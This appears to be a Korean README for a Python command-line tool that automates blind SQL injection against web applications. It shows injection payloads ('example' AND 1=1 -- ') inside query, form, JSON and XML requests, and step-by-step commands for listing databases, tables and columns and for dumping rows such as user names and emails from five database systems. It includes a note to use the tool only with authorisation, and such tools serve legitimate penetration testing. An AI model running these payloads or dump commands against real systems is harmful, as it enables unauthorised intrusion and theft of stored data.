# Blind SQL Injection CLI

HTTP 요청 파일을 읽어 참·거짓 응답의 크기 또는 문자열로 조건을 판별하고, 조회 결과를 SQLite에 저장하는 Python CLI입니다. 직접 소유하거나 테스트 권한이 있는 환경에서 사용하세요.

- **GET·POST** 지원: 쿼리, 폼, 중첩 JSON·배열, XML 요소·속성
- **MySQL·Oracle·DB2·MSSQL·PostgreSQL**: 기본 정보·메타데이터 조회 및 데이터 덤프
- 한글·이모지 추출, NULL 보존, 복합 정렬키·중복 검사, 추출 값 재검증
- 기본 크기 판별은 참·거짓 요청 **각 1회**로 시작하며 고정 20바이트 임계값을 사용하지 않음

저장소에는 CLI 소스·의존성·사용법만 포함합니다. 테스트 코드·실습 서버·Docker 환경은 포함하지 않습니다.

## 설치

Python **3.10 이상**이 필요합니다.

```sh
git clone https://github.com/kazal92/blind_sqli.git
cd blind_sqli
python -m venv .venv
```

Linux / macOS / WSL:

```sh
source .venv/bin/activate
python -m pip install -r requirements.txt
python sqli.py --help
```

Windows PowerShell:

```powershell
.\.venv\Scripts\python.exe -m pip install -r requirements.txt
.\.venv\Scripts\python.exe sqli.py --help
```

PowerShell에서 이후 예제의 `python`을 `.\.venv\Scripts\python.exe`로 바꾸면 됩니다. CLI는 HTTP로 대상 웹 서버에 접근하므로 DB 드라이버는 필요하지 않습니다. 대상 웹 서버·DB는 별도로 준비하세요.

## 빠른 사용법

프로젝트 안에 `requests/` 폴더를 만들고, 자신의 대상에서 캡처한 원본 HTTP 요청을 `requests/target.http`에 UTF-8로 저장합니다. 이 폴더는 Git에서 제외됩니다.

다음은 **요청 형식 예제**입니다. 주소·경로·파라미터·SQL 문맥은 실제 대상에 맞게 바꾸세요. 해당 서버는 이 저장소에 포함되어 있지 않습니다.

```http
GET /login?username=example&password=example%27+AND+1%3D1+--+ HTTP/1.1
Host: 127.0.0.1:5080

```

`password`의 디코딩된 값은 `example' AND 1=1 -- `입니다. 대상 값에 **`1=1`이 정확히 한 번** 있어야 하며, 도구가 이 부분만 조회 조건으로 바꿉니다. 헤더 다음의 빈 줄을 유지하세요.

```sh
# 기본 정보
python sqli.py -r requests/target.http -s http -p password --dbms mysql --basic

# DB 목록
python sqli.py -r requests/target.http -s http -p password --dbms mysql --dbs

# lab DB의 테이블
python sqli.py -r requests/target.http -s http -p password --dbms mysql --tables -D lab

# users 테이블의 컬럼
python sqli.py -r requests/target.http -s http -p password --dbms mysql --columns -D lab -T users

# 선택한 컬럼 덤프: id가 각 행을 고유하게 구분해야 함
python sqli.py -r requests/target.http -s http -p password --dbms mysql --dump -D lab -T users -C "id,name" --order-by id -d result.db
```

**`-d`는 결과 파일, `-D`는 DB 또는 소유자·스키마**입니다. 기본 프로토콜은 HTTPS이므로 HTTP 서버에는 `-s http`를 지정하세요. `--dbms`는 웹 서버가 실제 사용하는 DBMS에 맞춰야 합니다.

## 요청 형식과 대상 선택

`--location`을 생략하면 GET은 쿼리, POST는 Content-Type에 맞는 본문에서 대상을 찾습니다. POST의 쿼리 파라미터를 대상으로 하려면 `--location query`를 지정하세요. 본문의 다른 값은 유지됩니다.

| 요청 | `--location` | `-p` 예제 |
|---|---|---|
| GET·POST 쿼리 | `query` | `password` |
| POST 폼 | `form` | `password` |
| POST JSON 최상위 키 | `json` | `password` |
| POST 중첩 JSON·배열 | `json` | `/login/accounts/0/password` |
| POST XML 텍스트 | `xml` | `./login/password` |
| POST XML 속성 | `xml` | `./login/@password` |

같은 이름의 쿼리·폼 대상이 반복되거나 XML 경로가 여러 요소를 선택하면 중단합니다. 쿠키·헤더는 요청에 포함해 전송하지만 추출 대상으로 선택하는 기능은 없습니다.

### POST 폼

```http
POST /login HTTP/1.1
Host: 127.0.0.1:5080
Content-Type: application/x-www-form-urlencoded

username=example&password=example%27+AND+1%3D1+--+
```

`requests/form.http`에 저장했다면:

```sh
python sqli.py -r requests/form.http -s http -p password --dbms mysql --basic
```

### 중첩 JSON·배열

```http
POST /api/login HTTP/1.1
Host: 127.0.0.1:5080
Content-Type: application/json

{"login":{"accounts":[{"password":"example' AND 1=1 -- "}]},"remember":true}
```

```sh
python sqli.py -r requests/json.http -s http --location json -p /login/accounts/0/password --dbms mysql --basic
```

JSON Pointer는 `/`로 경로를 나눕니다. 배열 인덱스는 0부터 시작합니다. 키에 `/`가 있으면 `~1`, `~`가 있으면 `~0`으로 표현하세요. 루트 배열도 `/0/password`처럼 선택할 수 있습니다. 최상위에 `/`로 시작하는 키가 있다면 JSON Pointer로 이스케이프해 선택하세요.

대상은 문자열이어야 합니다. JSON의 다른 문자열·숫자·불리언·NULL은 유지하며 고정밀 소수를 float로 반올림하지 않습니다. 중복 JSON 키와 NaN·Infinity는 허용하지 않습니다. `application/json`과 `+json` 미디어 타입을 지원합니다.

### XML 요소·속성

```http
POST /api/login HTTP/1.1
Host: 127.0.0.1:5080
Content-Type: application/xml

<request><login password="example' AND 1=1 -- "/><keep>unchanged</keep></request>
```

```sh
# 위 예제의 password 속성
python sqli.py -r requests/xml.http -s http --location xml -p "./login/@password" --dbms mysql --basic

# <request><login><password>...</password></login></request> 형태의 텍스트 요소
python sqli.py -r requests/xml-text.http -s http --location xml -p "./login/password" --dbms mysql --basic
```

XML 경로는 **문서 루트 기준**입니다. `.`은 루트, `./p[2]`는 두 번째 p 요소, `.//p`는 하위 요소 검색입니다. 이름공간은 `./{urn:example}password`처럼 URI를 중괄호로 지정합니다. 기본 이름공간이 있어도 URI가 필요합니다. 속성도 `./login/@{urn:example}password`로 지정할 수 있습니다.

대상 텍스트 요소에 자식 요소가 있으면 중단합니다. XML 엔티티 이스케이프는 자동 처리하며 접두사·이름공간 선언·비대상 CDATA를 보존합니다. `application/xml`, `text/xml`, `+xml` 타입을 지원합니다. DTD·엔티티 선언은 허용하지 않습니다.

JSON·XML·폼은 파싱 후 재전송하며 UTF-8을 사용합니다. 원본 바이트·공백·속성 순서·전자서명 보존은 보장하지 않습니다. 압축 요청 본문, multipart, GET 본문, 중복 HTTP 헤더는 지원하지 않습니다. XML·JSON **요청 선택**과 응답의 구조화 필드 판별은 별개이며, 후자는 현재 제공하지 않습니다.

## 참·거짓 판별

### 기본: 응답 크기

요청 파일의 `1=1`을 전송하고, `1=2`로 바꾼 요청을 전송해 참·거짓 크기를 **각각 한 번** 측정합니다.

```text
참 응답: 1150 bytes (1회 측정)
거짓 응답: 1000 bytes (1회 측정)
```

이후 본문 크기가 참 기준과 정확히 같으면 참, 거짓 기준과 같으면 거짓입니다. 참이 더 짧아도 동작합니다. 두 기준 크기가 같거나 어느 쪽에도 일치하지 않으면 중단합니다. `--threshold` 옵션과 고정 20바이트 기준은 없습니다.

응답 크기가 변하거나 입력값이 응답에 반영되는 페이지에는 아래 문자열 방식을 사용하세요. 같은 크기의 오류 페이지는 크기만으로 구분할 수 없습니다.

### 선택: 문자열

```sh
python sqli.py -r requests/target.http -s http -p password --dbms mysql --basic --string "LOGIN SUCCESS" --not-string "LOGIN FAILED"
```

- `--string`만 지정: 해당 문구가 있으면 참, 없으면 거짓
- `--not-string`만 지정: 해당 문구가 있으면 거짓, 없으면 참
- 둘 다 지정: 참 문구만 있으면 참, 거짓 문구만 있으면 거짓. 둘 다 있거나 둘 다 없으면 중단

문구는 HTML 소스를 포함한 응답 본문에서 대소문자를 구분해 찾습니다. 실제 응답에 맞게 지정하세요. 문구 하나만 사용하면 문구가 없는 오류 페이지를 반대 결과로 판단할 수 있습니다.

두 방식 모두 시작할 때 참·거짓 기준을 각각 한 번 검증하고, 조회 판별 50회마다 및 저장 직전에도 기준을 확인합니다. 자동 재요청·재학습은 하지 않습니다. 추출 값 검증을 위한 SQL 요청은 별도로 전송하므로 전체 실행이 두 요청으로 끝나는 것은 아닙니다.

## 모든 DBMS에서 덤프

`--dump`에는 **테이블 하나**, `-C` 컬럼 목록, `--order-by` 정렬키가 필요합니다. 정렬키는 쉼표로 복합 지정할 수 있습니다. 이름을 지정하는 옵션이며 SQL 표현식이나 `DESC` 구문을 받지 않습니다.

```sh
# MySQL: 복합키로 정렬
python sqli.py -r requests/mysql.http -s http -p password --dbms mysql --dump -D lab -T users -C "name,email" --order-by "tenant_id,id"

# PostgreSQL: 현재 연결된 DB와 스키마
python sqli.py -r requests/postgresql.http -s http -p password --dbms postgresql --dump -D lab --db-schema public -T users -C "name,email" --order-by id

# SQL Server: DB·스키마를 나누어 지정
python sqli.py -r requests/mssql.http -s http -p password --dbms mssql --dump -D lab --db-schema dbo -T users -C "name,email" --order-by id

# Oracle: -D는 소유자
python sqli.py -r requests/oracle.http -s http -p password --dbms oracle --dump -D LAB -T USERS -C "NAME,EMAIL" --order-by ID

# DB2: -D는 스키마
python sqli.py -r requests/db2.http -s http -p password --dbms db2 --dump -D LAB -T USERS -C "NAME,EMAIL" --order-by ID
```

먼저 컬럼의 존재·타입과 정렬키 중복을 확인합니다. 추출한 숫자는 값이 같은지 다시 검사하고, 문자열은 길이와 문자별 HEX 표현을 검증합니다. 덤프는 행별 검증에 이어 완료 전 행 수·정렬키 중복·전체 선택 셀도 다시 확인합니다. 불일치하면 해당 실행 결과를 저장하지 않습니다.

이 검사는 **트랜잭션 스냅샷을 제공하지 않습니다.** 데이터가 계속 바뀌는 테이블의 일관성을 완전히 보장할 수 없으므로 변경이 없는 환경에서 실행하세요. 검증 요청이 추가되어 이전 ASCII 추출보다 요청 수가 많아집니다.

## 데이터·DBMS 지원 범위

| DBMS | `-D` 의미 | 기본 정보 / `--dbs` | 스키마·문자 처리 |
|---|---|---|---|
| MySQL | DB | 버전·사용자 / DB 목록 | `utf8mb4`로 문자 변환 |
| Oracle | 소유자 | 버전·사용자 / 접근 가능한 테이블 소유자 | `UTL_I18N`·`TO_NCHAR` 사용 권한 필요 |
| DB2 LUW | 스키마 | 현재 DB / 스키마 목록 | UTF-8 Unicode DB 필요. 시작 시 알려진 한글 HEX로 확인 |
| MSSQL | DB | 버전·사용자 / DB 목록 | 기본 스키마 `dbo`, SQL Server 2012 이상 구문, UTF-16 단위 처리 |
| PostgreSQL | 현재 연결된 DB | 버전·사용자 / DB 목록 | 기본 스키마 `public`. 다른 DB로 연결 전환 불가 |

모든 DBMS에 테이블·컬럼 조회와 덤프를 구현했습니다. DB·테이블·컬럼의 대소문자는 실제 카탈로그 이름과 일치시켜야 합니다. `--dbms`가 DB 연결을 전환하거나 자동 탐지하지는 않습니다.

- 일반 텍스트·숫자·날짜·시간 등 지원 스칼라 타입을 덤프하며, **NULL 외의 값은 문자열**로 저장합니다. 날짜 형식·소수 표현은 DB·세션 설정에 영향을 받을 수 있습니다.
- NULL은 JSON `null`, SQLite `NULL`로 보존하고 빈 문자열과 구분합니다. **Oracle은 DB 자체가 빈 문자열을 NULL로 취급**하므로 둘을 복원해 구분할 수 없습니다.
- 한글·이모지는 문자별 HEX를 복원해 처리합니다. MySQL·PostgreSQL·Oracle·DB2는 UTF-8, SQL Server는 UTF-16LE를 사용합니다.
- `--max-len`은 문자열 하나의 추출 단위 상한입니다. SQL Server에서는 이모지 등 보충 문자가 UTF-16 두 단위를 차지합니다. 다른 DBMS에서는 Unicode 코드 포인트 기준입니다.
- 바이너리·BLOB·Oracle CLOB/NCLOB·DB2 CLOB/DBCLOB·배열·사용자 정의 타입 등 화이트리스트 밖의 타입은 명시적으로 거부합니다. 모든 DB 타입의 원본 백업·복원을 지원하는 도구는 아닙니다.
- PostgreSQL JSON/XML과 SQL Server text/ntext/XML은 정렬키로 사용할 수 없습니다. 지원하는 숫자·문자 등의 고유 키를 지정하세요.
- DB2의 VARCHAR 변환 한도는 32,672바이트입니다. 원본과 변환 길이를 비교해 잘린 결과 저장을 막습니다. Oracle은 NVARCHAR2·함수의 서버별 길이 한도를 넘으면 오류로 중단할 수 있습니다.

## 전체 옵션

| 옵션 | 용도 | 기본값 / 조건 |
|---|---|---|
| `-r`, `--request-file` | UTF-8 원본 요청 파일 | 필수 |
| `-p` | 파라미터 이름·JSON Pointer·XML 경로 | 필수 |
| `--location` | `auto`, `query`, `form`, `json`, `xml` | `auto` |
| `--dbms` | `mysql`, `oracle`, `db2`, `mssql`, `postgresql` | 필수 |
| `-s` | `http` 또는 `https` | `https` |
| `-d` | 결과 SQLite 파일 | `result.db` |
| `--basic` | 기본 정보 | 실행 모드 |
| `--dbs` | DB·소유자·스키마 목록 | 실행 모드 |
| `--tables` | 테이블 목록 | `-D` 필수 |
| `--columns` | 컬럼 목록 | `-D`, `-T` 필수 |
| `--dump` | 데이터 덤프 | `-D`, 테이블 하나의 `-T`, `-C`, `--order-by` 필수 |
| `-D` | DB 또는 소유자·스키마 | 모드에 따라 필수 |
| `-T` | 테이블, 컬럼 조회 시 쉼표로 여러 개 가능 | 컬럼 조회·덤프 |
| `-C` | 덤프 컬럼, 예: `"ID,NAME"` | 덤프 전용 |
| `--order-by` | 단일·복합 고유 정렬키, 예: `"TENANT,ID"` | 덤프 전용 |
| `--db-schema` | MSSQL·PostgreSQL 스키마 | 각각 `dbo`, `public` |
| `--string` | 참 응답 문구 | 지정하면 문자열 판별 |
| `--not-string` | 거짓 응답 문구 | 지정하면 문자열 판별 |
| `--proxy` | 프록시 URL 또는 `host:port` | 지정하지 않음 |
| `--timeout` | 요청 한 건 제한 시간(초) | `30` |
| `--max-len` | 문자열 추출 단위 상한 | `256` |
| `--max-rows` | 목록·덤프 행 수 상한 | `1000` |
| `--insecure` | HTTPS 인증서 검증 생략 | 기본은 검증 |
| `-h`, `--help` | 도움말 | 표시 후 종료 |

실행 모드는 한 번에 하나만 선택합니다. Burp를 사용하면 `--proxy 127.0.0.1:8080`을 추가하고, Intercept를 끄거나 요청을 계속 전달하세요. 자체 서명 인증서를 쓰는 환경에서는 필요할 때 `--insecure`를 지정합니다.

## 결과 확인·오류 해결

성공하면 JSON과 `결과 저장 완료: ...`가 출력됩니다. 저장 경로의 상위 폴더는 미리 만드세요. SQLite 뷰어에서 다음 SQL로 실행 기록을 확인할 수 있습니다.

```sql
SELECT id, created_at, dbms, mode, database_name, schema_name, results_json
FROM runs
ORDER BY id DESC;
```

`runs`가 실행별 DBMS·스키마·전체 결과의 기준입니다. 호환용 `basic_info`, `basic_results`, `dbs_info`, `table_info`, `column_info`, `data_dump`도 유지합니다. 실패한 실행은 저장 트랜잭션을 취소합니다. 초기화 단계에서 빈 파일·테이블이 만들어질 수는 있습니다.

| 오류 | 확인할 내용 |
|---|---|
| 대상에 `1=1` 필요 | 디코딩된 대상 값에 정확히 한 번 넣기 |
| 대상 값·경로를 찾지 못함 | `--location`, JSON Pointer, XML 이름공간·인덱스 확인 |
| 참·거짓 응답 크기가 같음 | 문자열 판별 사용, 요청 SQL 문맥 확인 |
| 응답 판별 불가·기준 변경 | 세션 만료·오류 페이지·크기 변동·문구 확인 |
| 정렬키 중복 | 행을 고유하게 구분하는 복합키 지정 |
| 추출 결과 검증 실패 | 데이터 변경·오판 가능성 확인 후 다시 실행 |
| 지원하지 않는 컬럼 타입 | 지원 스칼라 컬럼만 선택 |
| HTTP 301·302 | 최종 URL의 요청 저장. 리디렉션은 따라가지 않음 |
| HTTP 401·403 | 인증·권한 확인 |
| HTTP 500 | 대상 서버 로그·SQL 문맥·DBMS·함수 권한 확인 |
| 연결 실패 | Host·포트·프로토콜·프록시·인증서 확인 |
| 상한 초과 | 길이·행 수 옵션 또는 DB 함수 한도 확인 |
| SQLite 파일 열기 실패 | 상위 폴더 존재·쓰기 권한 확인 |

## 검증 범위와 파일 구성

개발 검증은 저장소 밖에서 수행합니다. 요청 파싱·변환, 크기·문자열 판별, 한글·이모지·NULL 보존, 정렬키 검사, 실패 시 저장 취소 등을 검사했습니다. MySQL·PostgreSQL 구문은 변환 후 SQLite에서 실제 SQL 평가를 수행해 추출·저장 흐름을 확인했습니다. 이는 해당 DB 서버에서 실행한 통합 테스트와 다릅니다.

MySQL·PostgreSQL·T-SQL·Oracle 생성 SQL은 SQLGlot 구문 검사를 수행했고, DB2는 생성 구조와 공식 함수 문서를 대조했습니다. 현재 환경의 Docker 권한 제한으로 5개 실제 DB 서버 검증은 수행하지 못했습니다. DBMS·버전·권한·문자셋에 따른 추가 확인이 필요합니다.

```text
sqli.py                 CLI 진입점
sqli_tool/
  cli.py                옵션·입력 검증
  targets.py            JSON Pointer·XML 대상 선택·변경
  http.py               GET·POST 요청 파싱·통신
  oracle.py             응답 크기·문자열 판별
  dbms.py               DBMS별 SQL·타입·문자 변환
  engine.py             추출·덤프·결과 검증
  storage.py            SQLite 저장
  main.py               실행·종료 처리
requirements.txt        실행 의존성
README.md               설치·사용법
.gitignore              요청·결과·캐시 제외
```

SQL 구현 참고: [MySQL 문자열 함수](https://dev.mysql.com/doc/refman/8.4/en/string-functions.html), [PostgreSQL 인코딩 변환](https://www.postgresql.org/docs/current/functions-binarystring.html), [SQL Server CAST·CONVERT](https://learn.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql), [Oracle TO_NCHAR](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/TO_NCHAR-character.html), [Oracle LENGTH](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/LENGTH.html), [DB2 SUBSTRING](https://www.ibm.com/docs/en/db2/11.1.0?topic=functions-substring), [DB2 NCHR](https://www.ibm.com/docs/en/db2/11.5.x?topic=functions-nchr).
